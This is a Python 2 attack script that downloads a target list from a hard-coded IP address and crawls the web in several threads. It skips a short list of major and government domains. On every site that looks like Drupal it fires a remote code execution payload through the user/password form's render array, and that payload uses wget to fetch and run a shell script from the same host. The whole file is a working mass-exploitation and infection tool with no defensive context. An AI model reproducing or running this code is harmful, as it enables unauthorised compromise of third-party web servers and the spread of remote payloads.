from Queue import Queue
from threading import Thread
import urllib2, time, re, socket, sys

threadcount = 10
timeout = 5
serverurl = "http://51.255.91.41/y.php"
domain_queue = Queue()
threads = []

def notinbl(qurl):
	bl = ['facebook', 'ebay', 'linkedin', '.gov', 'microsoft', 'google']
	for x in bl:
		if x in qurl:
			return False
	return True

def drupal(target):
	try:
		payload = "name[%23post_render][]=passthru&name[%23markup]=wget%20-O%20/tmp/a.sh%20http://51.255.91.41/a.sh;%20sh%20/tmp/a.sh&name[%23type]=markup"
		url = target + "?q=user/password&" + payload
		print "getting formid"
		req = urllib2.Request(url, "form_id=user_pass&_triggering_element_name=name")
		response = urllib2.urlopen(req)
		html = response.read()
		m = re.findall('name="form_build_id" value="(.*?)"', html)
		if m:
			formid = m[0]
			print formid
			url = target + "?q=file/ajax/name/%23value/" + formid
			payload = "name[#post_render][]=passthru&name[#markup]=#{@command}&name[#type]=markup"
			req = urllib2.Request(url, "form_build_id=" + formid)
			response = urllib2.urlopen(req)
			html = response.read()
	except Exception:
		return
	
def scrapedomain(i, q):
	while 1:
		isdrupal = False
		url = q.get()
		if url[-1:] == "/":
			url = url[:-1]
		#sys.stdout.write('.')
		#sys.stdout.flush()
		print "S: " + url
		html = ""
		try:
			socket.setdefaulttimeout(timeout)
			html = urllib2.urlopen(url, timeout = 5).read()
		except Exception: 
			q.task_done()
			continue
		if "Drupal" in html:
			isdrupal = True
		domlinks = re.findall('<a .*?href="(http.*?)"', html)
		for l in domlinks:
			try:
				l=l.split("/")[0] + "//" + l.split("/")[2].split("?")[0]
				if l not in q.queue:
					if notinbl(l):
						q.put(l)
			except Exception:
				continue
		reglinks = re.findall('<a .*?href="(/.*?)"', html)
		count = 0
		for l in reglinks:
			count = count + 1
			if count == 5:
				break
			html2 = ""
			try:
				socket.setdefaulttimeout(timeout)
				html2 = urllib2.urlopen(url + l, timeout = 5).read()
			except Exception:
				continue
			if "Drupal" in html2:
				isdrupal = True
			domlinks2 = re.findall('<a .*?href="(http.*?)"', html2)
			for l in domlinks2:
				try:
					l=l.split("/")[0] + "//" + l.split("/")[2].split("?")[0]
					if l not in q.queue:
						if notinbl(l):
							q.put(l)
				except Exception:
					continue
		if isdrupal == True:
			drupal(url)
		q.task_done()


data = ""
try:
	data=urllib2.urlopen(serverurl).read()
except Exception:
	print "Error grabbing urllist, sleeping"
	time.sleep(2)
	pass
domains = data.splitlines()
map(domain_queue.put, domains)
for i in range(threadcount):
	worker = Thread(target=scrapedomain, args=(i, domain_queue,))
	worker.setDaemon(True)
	threads.append(worker)
	worker.start()
#while 1:
#	for t in threads:
#		if t.isAlive():
#			zzzzzz=1
#		else:
#			threads.remove(t)
#			print "Thread died restarting"
#			worker = Thread(target=scrapedomain, args=(i, domain_queue,))
#			worker.setDaemon(True)
#			threads.append(worker)
#			worker.start()
domain_queue.join()
